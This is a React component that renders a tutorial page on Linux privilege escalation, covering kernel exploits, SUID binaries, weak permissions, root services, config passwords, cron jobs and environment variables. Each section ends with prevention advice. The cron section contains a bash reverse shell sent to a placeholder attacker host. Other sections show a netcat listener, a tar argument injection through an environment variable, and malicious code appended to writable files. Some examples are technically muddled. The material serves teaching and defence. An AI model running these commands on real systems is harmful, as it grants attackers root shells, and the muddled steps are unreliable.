import { useEffect, useRef } from "react";
import "./TypesOfPrivilegeEscalation.css";

const TypesOfPrivilegeEscalation = ({ setRef }) => {
  const sectionRefs = {
    KernelExploits: useRef(null),
    SUIDBinaries: useRef(null),
    FilePermissions: useRef(null),
    RootServices: useRef(null),
    ConfigPasswords: useRef(null),
    CronJobs: useRef(null),
    EnvVariables: useRef(null),
  };

  // eslint-disable-next-line react-hooks/exhaustive-deps
  useEffect(() => {
    setRef((sectionId) => {
      const section = sectionRefs[sectionId];
      if (section && section.current) {
        section.current.scrollIntoView({ behavior: "smooth" });
      }
    });
  }, [setRef]);

  return (
    <div className="types-container">
      <h2 ref={sectionRefs.KernelExploits}>Kernel Exploits</h2>
      <p>
        Kernel exploits target vulnerabilities in the core of the operating system, allowing attackers to escalate privileges to root.
        These are powerful because the kernel has full control over the system.
      </p>

      <h3>🧠 What is a Kernel?</h3>
      <p>
        The kernel is the central part of the OS that manages hardware, memory, processes, and more. If compromised, the attacker gains full control of the system.
      </p>

      <h3>🔍 How to Check Kernel Version</h3>
      <pre>
        <code>uname -r</code>
      </pre>
      <p>
        This command displays the running kernel version. You can use it to search for known vulnerabilities.
      </p>

      <h3>📚 Finding Exploits</h3>
      <p>
        Use websites like <a href="https://www.exploit-db.com" target="_blank" rel="noreferrer">Exploit-DB</a> or tools like <code>searchsploit</code>:
      </p>
      <pre>
        <code>searchsploit linux kernel 4.15</code>
      </pre>

      <h3>💥 Exploitation Example (Dirty COW)</h3>
      <p>
        Dirty COW (CVE-2016-5195) is a well-known kernel exploit that allowed privilege escalation.
      </p>
      <pre>
        <code>
          gcc dirtycow.c -o dirtycow
          ./dirtycow
        </code>
      </pre>
      <p>
        After running this exploit, you might gain root shell (only if the system is vulnerable).
      </p>

      <h3>🛡️ How to Prevent Kernel Exploits</h3>
      <ul>
        <li>Always keep the system and kernel updated.</li>
        <li>Use minimal privileges.</li>
        <li>Enable security modules like AppArmor or SELinux.</li>
      </ul>


      {/* Add the content for SUID/GUID Binaries */}
      <h2 ref={sectionRefs.SUIDBinaries}>SUID/GUID Binaries</h2>
      <p>
        SUID (Set User ID) and GUID (Set Group ID) binaries are executable files that run with the privileges of the file owner (for SUID) or group (for GUID). If these binaries are misconfigured, they can lead to privilege escalation.
      </p>

      <h3>🧠 What are SUID/GUID Binaries?</h3>
      <p>
        SUID and GUID are special permissions that allow executable files to run with the privileges of the file's owner or group. This is often used by system utilities that need elevated privileges, but improper configurations can lead to security risks.
      </p>

      <h3>🔍 How to Identify SUID Binaries</h3>
      <p>
        You can search for SUID binaries using the following command:
      </p>
      <pre><code>find / -type f -executable -perm -4000</code></pre>
      <p>
        This will return all executables with the SUID permission bit set. Be cautious with these files, especially if they are owned by root.
      </p>

      <h3>💥 Exploitation Example</h3>
      <p>
        If a binary is misconfigured with the SUID bit set and it is writable by an unprivileged user, it could allow for privilege escalation. For example:
      </p>
      <pre><code>find / -type f -executable -perm -4000
        # Change permissions to make it writable
        chmod +x /path/to/vulnerable_binary
        # Exploit the vulnerability
        /path/to/vulnerable_binary</code></pre>
      <p>
        This could allow an attacker to escalate privileges to root, depending on the nature of the binary.
      </p>

      <h3>🛡️ How to Prevent SUID/GUID Exploits</h3>
      <ul>
        <li>Regularly audit and remove unnecessary SUID binaries.</li>
        <li>Ensure that SUID binaries are only used where absolutely necessary.</li>
        <li>Use `chmod -s` to remove the SUID bit from binaries that do not require it.</li>
      </ul>

      <h2 ref={sectionRefs.FilePermissions}>Weak File Permissions</h2>
      <p>
        Weak file permissions occur when files or directories have overly permissive access rights, such as allowing any user to read, write, or execute them. This can lead to potential exploitation, especially when sensitive files are involved.
      </p>

      <h3>🧠 What are File Permissions?</h3>
      <p>
        In Linux, files and directories have permissions that control who can read, write, or execute them. The permissions are divided into three categories: owner, group, and others. Each category can have read (r), write (w), or execute (x) permissions. The permissions are represented numerically (e.g., `755`, `777`) or symbolically (e.g., `rwxr-xr-x`).
      </p>

      <h3>🔍 How to Check Weak File Permissions</h3>
      <p>
        You can check the permissions of a file using the <code>ls -l</code> command:
      </p>
      <pre>
        <code>ls -l /path/to/file</code>
      </pre>
      <p>
        This will show you the file permissions. If you see <code>777</code> or other overly permissive values, the file is considered weak.
      </p>

      <h3>📚 Finding Files with Weak Permissions</h3>
      <p>
        Use the <code>find</code> command to locate files with weak permissions. For example, to find world-writable files:
      </p>
      <pre>
        <code>find / -type f -perm 777</code>
      </pre>
      <p>
        This command will search for files that are readable, writable, and executable by everyone, which is a common security risk.
      </p>

      <h3>💥 Exploitation Example (Weak File Permissions)</h3>
      <p>
        If a file like a configuration file or script has weak permissions (e.g., `777`), an attacker can modify it. For example:
      </p>
      <pre>
        <code>
          echo 'malicious_code' &gt;&gt; /path/to/weakfile
        </code>
      </pre>
      <p>
        In this case, an attacker could inject malicious code into a file that is executed by a higher-privileged user, leading to potential privilege escalation.
      </p>

      <h3>🛡️ How to Prevent Weak File Permissions</h3>
      <ul>
        <li>Always apply the principle of least privilege, using restrictive permissions such as <code>chmod 755</code> or <code>chmod 700</code> for files.</li>
        <li>Regularly audit sensitive files to ensure they have correct permissions (e.g., configuration files should not be world-writable).</li>
        <li>Use tools like <code>find</code> and <code>lsattr</code> to monitor file permissions across the system.</li>
        <li>Consider using access control lists (ACLs) to provide more granular control over file access.</li>
      </ul>




      <h2 ref={sectionRefs.RootServices}>Exploiting Root Services</h2>
      <p>
        Root services are critical system services that run with root privileges. If misconfigured or vulnerable, these services can be exploited by attackers to escalate their privileges.
      </p>

      <h3>🧠 What Are Root Services?</h3>
      <p>
        Root services are programs that run with root (administrator) privileges and perform critical functions for the system, such as networking or user authentication. These services can be exploited if improperly configured.
      </p>

      <h3>🔍 Checking for Root Services</h3>
      <p>
        You can check for services running with root privileges using the following command:
      </p>
      <pre>
        <code>ps aux | grep root</code>
      </pre>

      <h3>💥 Exploitation Example</h3>
      <p>
        If a vulnerable root service is found, an attacker can exploit it. For example, a remote service could be used to open a reverse shell.
      </p>
      <pre>
        <code>nc -lvp 4444</code>
      </pre>

      <h3>🛡️ How to Prevent Exploiting Root Services</h3>
      <ul>
        <li>Review running services regularly and disable unnecessary ones.</li>
        <li>Use security frameworks like SELinux or AppArmor to restrict the service's access.</li>
        <li>Always patch services and systems to fix vulnerabilities promptly.</li>
      </ul>



      <h2 ref={sectionRefs.ConfigPasswords}>Passwords in Config Files</h2>
      <p>
        Storing passwords in configuration files is a common mistake. If these files are not properly secured, attackers can gain access to sensitive information like database credentials, leading to a potential breach.
      </p>

      <h3>🧠 Why Store Passwords in Config Files?</h3>
      <p>
        Some applications store passwords in configuration files for ease of access, such as database credentials or API keys. While this may be convenient, it is a significant security risk.
      </p>

      <h3>🔍 Example of a Vulnerable Config File</h3>
      <p>
        Here is an example of a vulnerable configuration file where the password is stored in plaintext:
      </p>
      <pre>
        <code>
          &lt;?php
          $db_host = "localhost";
          $db_user = "admin";
          $db_password = "password123";
          ?&gt;
        </code>
      </pre>

      <h3>💥 Exploitation Example</h3>
      <p>
        If an attacker gains access to this configuration file, they can easily retrieve the password and gain access to the system or services that use it.
      </p>

      <h3>🛡️ How to Prevent Storing Passwords in Config Files</h3>
      <ul>
        <li>Use environment variables to store sensitive information securely.</li>
        <li>Restrict file permissions to prevent unauthorized access to config files.</li>
        <li>Use secrets management tools (like HashiCorp Vault) to handle sensitive data.</li>
      </ul>

      <h2 ref={sectionRefs.CronJobs}>Cron Jobs</h2>
      <p>
        A cron job is a scheduled task that runs automatically at specific intervals, such as every minute, hour, or day.
        It is managed by the cron daemon. If a cron job running with elevated privileges (like root) is misconfigured,
        it can lead to privilege escalation by attackers.
      </p>

      <h3>🔍 How to Find Cron Jobs</h3>
      <pre>
        <code>
          # View current user's cron jobs
          crontab -l

          # View root user's cron jobs
          sudo crontab -l

          # View system-wide cron jobs
          cat /etc/crontab

          # List scripts in common cron directories
          ls -la /etc/cron.d/
          ls -la /etc/cron.daily/
          ls -la /etc/cron.hourly/
        </code>
      </pre>

      <h3>⚠️ Example of a Vulnerable Cron Job</h3>
      <p>
        Suppose you find this entry in <code>/etc/crontab</code>:
      </p>
      <pre>
        <code>
          * * * * * root /home/dev/backup.sh
        </code>
      </pre>
      <p>
        If <code>backup.sh</code> is writable by any user, it means an attacker can modify this script and execute commands as root.
      </p>

      <h3>💣 Exploiting the Vulnerability</h3>
      <p>Check the file permissions first:</p>
      <pre>
        <code>
          ls -l /home/dev/backup.sh
          -rwxrwxrwx 1 root root 64 Apr 1 10:00 /home/dev/backup.sh
        </code>
      </pre>
      <p>Inject a reverse shell or malicious command:</p>
      <pre>
        <code>
          echo "bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1" &gt; /home/dev/backup.sh
        </code>
      </pre>
      <p>
        Now, once the cron job runs (every minute), the attacker's reverse shell will trigger, and they gain root access.
      </p>

      <h3>🛡️ Mitigation and Prevention</h3>
      <ul>
        <li>Do not schedule root cron jobs pointing to scripts in world-writable locations.</li>
        <li>Ensure the script has correct permissions:
          <pre><code>chmod 700 /home/dev/backup.sh</code></pre>
        </li>
        <li>Change ownership to root:
          <pre><code>chown root:root /home/dev/backup.sh</code></pre>
        </li>
        <li>Avoid hardcoding cron jobs in <code>/etc/crontab</code> that run custom user scripts.</li>
      </ul>

      <h3>🧠 Quick Summary</h3>
      <ul>
        <li><strong>Check:</strong> Cron job file paths and permissions</li>
        <li><strong>Exploit:</strong> Inject code if writable</li>
        <li><strong>Gain:</strong> Root access when cron runs</li>
        <li><strong>Prevent:</strong> Use secure permissions and verify ownership</li>
      </ul>




      <h2 ref={sectionRefs.EnvVariables}>Environment Variables</h2>

      <p>
        Environment variables are dynamic values used by processes and the system to store temporary data such as paths,
        credentials, API keys, or configurations. If sensitive variables are exposed or misused, it can lead to serious
        vulnerabilities such as privilege escalation, information disclosure, or code execution.
      </p>

      <h3>🔍 Finding Environment Variables</h3>
      <pre>
        <code>
          # Print all environment variables for current shell
          env

          # Show specific variable value (example: PATH)
          echo $PATH

          # See user-defined variables in scripts
          cat script.sh
        </code>
      </pre>

      <h3>⚠️ Vulnerable Scenario Example</h3>
      <p>Suppose you find this script owned by root but readable by a low-privileged user:</p>
      <pre>
        <code>
          #!/bin/bash
          echo "Starting backup..."
          tar -czf /root/backup.tar.gz $BACKUP_SRC
          echo "Backup done!"
        </code>
      </pre>
      <p>
        Here, <code>$BACKUP_SRC</code> is not safely defined in the script. An attacker can define it externally and run the script (if allowed).
      </p>

      <h3>💣 Exploitation via Environment Variable Injection</h3>
      <pre>
        <code>
          # Set malicious value to execute code
          export BACKUP_SRC="--checkpoint=1 --checkpoint-action=exec=sh shell.sh"

          # Create a malicious script
          echo "id" &gt; shell.sh
          chmod +x shell.sh

          # Run the vulnerable script
          ./vuln_script.sh
        </code>
      </pre>
      <p>
        This injects a command using the tar utility's options and runs <code>shell.sh</code>, gaining a shell or executing malicious code.
      </p>

      <h3>🕵️‍♂️ Other Common Sensitive Variables</h3>
      <ul>
        <li><code>LD_PRELOAD</code> – Can load a malicious shared library</li>
        <li><code>LD_LIBRARY_PATH</code> – Affects dynamic linking</li>
        <li><code>PATH</code> – Can be poisoned to execute malicious binaries</li>
        <li><code>PYTHONPATH</code>, <code>NODE_PATH</code> – Used to load attacker-controlled modules</li>
      </ul>

      <h3>🛡️ Mitigation and Prevention</h3>
      <ul>
        <li>Never rely on externally-defined environment variables inside privileged scripts.</li>
        <li>Sanitize and hardcode expected paths inside secure scripts.</li>
        <li>Unset or validate dangerous variables before using system tools (like <code>tar</code>, <code>bash</code>, etc.).</li>
        <li>Set secure permissions (chmod 700) on sensitive scripts.</li>
      </ul>

      <h3>🧠 Quick Summary</h3>
      <ul>
        <li><strong>Check:</strong> If environment variables are user-controlled</li>
        <li><strong>Exploit:</strong> Inject commands via those variables</li>
        <li><strong>Gain:</strong> Arbitrary code execution or sensitive data</li>
        <li><strong>Prevent:</strong> Avoid using external variables in root scripts</li>
      </ul>
    </div>
  );
};

export default TypesOfPrivilegeEscalation;
